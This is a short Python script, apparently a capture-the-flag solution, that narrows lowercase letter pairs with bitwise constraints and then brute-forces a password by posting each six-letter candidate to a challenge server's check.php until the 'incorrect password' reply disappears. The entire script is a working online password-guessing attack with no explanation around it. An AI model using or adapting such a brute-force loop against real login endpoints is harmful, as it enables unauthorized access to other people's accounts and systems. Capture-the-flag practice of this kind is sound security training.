import requests

v1 = []
v2 = []
v3 = []

for x in range(97, 123):
    for y in range(97, 123):
        if x & y == 0x60:
            v1.append([x, y])

for x in range(97, 123):
    for y in range(97, 123):
        if x | y == 0x61:
            v2.append([x, y])

for x in range(97, 123):
    for y in range(97, 123):
        if x ^ y == 0x6:
            v3.append([x, y])

cnt = 0
for a, b in v1:
        for e, f in v3:
            x = "".join([chr(i) for i in [a, 97, b, e, 97, f]])
            req = requests.post(
                "http://chal.pctf.competitivecyber.club:9096/check.php", data={"password": x})
            if "incorrect password" not in req.text:
                print(req.text)
                exit()
            print("\r%d %s" % (cnt, x), end="")
            cnt +=1